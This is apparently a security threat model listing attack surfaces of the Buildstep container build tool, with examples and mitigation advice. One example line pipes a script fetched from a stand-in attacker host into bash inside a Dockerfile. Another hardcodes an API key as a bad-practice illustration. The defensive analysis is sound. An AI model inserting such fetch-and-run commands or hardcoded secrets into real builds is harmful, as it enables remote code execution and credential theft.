Here's the updated list of high and critical attack surfaces directly involving Buildstep:

* **Dockerfile Injection/Manipulation:**
    * **Description:** An attacker injects malicious commands or scripts into the Dockerfile used by Buildstep.
    * **How Buildstep Contributes:** Buildstep directly uses the provided Dockerfile to build the application image. If the source of the Dockerfile is compromised or not properly validated, Buildstep will execute the malicious content.
    * **Example:** An attacker gains access to the Git repository containing the Dockerfile and adds a command like `RUN curl http://evil.com/malicious.sh | bash` to steal secrets or install backdoors.
    * **Impact:** Arbitrary code execution within the build environment, potentially leading to data breaches, compromised infrastructure, or the creation of backdoored application images.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Implement strict access controls and code review processes for Dockerfile changes.
        * Use trusted and verified base images.
        * Employ static analysis tools to scan Dockerfiles for suspicious commands or patterns.
        * Avoid constructing Dockerfiles dynamically based on untrusted input.

* **Build Context Exploitation:**
    * **Description:** An attacker manipulates the files and directories included in the build context that Buildstep uses.
    * **How Buildstep Contributes:** Buildstep uses the provided build context as the source for the build process. If an attacker can influence the contents of this context, they can introduce malicious files or overwrite legitimate ones, which Buildstep will then process.
    * **Example:** An attacker compromises a developer's machine and adds a malicious script disguised as a legitimate library file to the build context. This script is then executed during the build process by Buildstep.
    * **Impact:** Compromised build process, introduction of malware into the application image, potential data exfiltration.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Secure the source of the build context (e.g., the Git repository).
        * Use a `.dockerignore` file to explicitly exclude unnecessary or sensitive files from the build context.
        * Implement integrity checks for files within the build context.
        * Regularly scan developer machines for malware.

* **Exposure of Build Secrets:**
    * **Description:** Sensitive information like API keys, passwords, or certificates are exposed during the build process managed by Buildstep.
    * **How Buildstep Contributes:** Buildstep executes commands and manages the build environment. If secrets are hardcoded in the Dockerfile, passed as insecure environment variables that Buildstep processes, or printed to build logs generated by Buildstep, it facilitates their exposure.
    * **Example:** A Dockerfile contains `ENV API_KEY=supersecretkey` or a build script echoes a password to the console, which is captured in the Buildstep logs.
    * **Impact:** Compromise of sensitive credentials, leading to unauthorized access to systems and data.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * Avoid hardcoding secrets in Dockerfiles or build scripts.
        * Use secure secret management solutions (e.g., HashiCorp Vault, AWS Secrets Manager) and inject secrets at runtime.
        * Utilize Buildkit's secret mounting features if available.
        * Sanitize build logs to remove sensitive information.

* **Insecure Base Images:**
    * **Description:** Buildstep uses a base Docker image that contains known vulnerabilities.
    * **How Buildstep Contributes:** Buildstep relies on the `FROM` instruction in the Dockerfile. If this instruction points to an outdated or vulnerable base image, Buildstep will build upon that insecure foundation.
    * **Example:** A Dockerfile uses `FROM ubuntu:latest` without specifying a specific version. The latest Ubuntu image has a recently discovered critical vulnerability, which Buildstep incorporates into the final image.
    * **Impact:** The resulting application image inherits the vulnerabilities of the base image, increasing the attack surface.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Regularly update base images to their latest stable and patched versions.
        * Use minimal and hardened base images.
        * Scan base images for vulnerabilities before using them in the build process.
        * Consider using distroless images where appropriate.

* **Registry Credential Exposure:**
    * **Description:** The credentials used by Buildstep to access container registries are exposed.
    * **How Buildstep Contributes:** Buildstep needs credentials to pull base images and push the built image. If these credentials are not stored and managed securely within Buildstep's configuration, they can be compromised.
    * **Example:** Registry credentials are stored in plain text in Buildstep's configuration file or are leaked through environment variables that Buildstep uses.
    * **Impact:** Unauthorized access to the container registry, potentially allowing attackers to push malicious images or delete legitimate ones.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Use secure credential management mechanisms provided by the registry or a dedicated secrets manager.
        * Avoid storing credentials directly in Buildstep's configuration files.
        * Implement proper access controls for Buildstep's configuration.
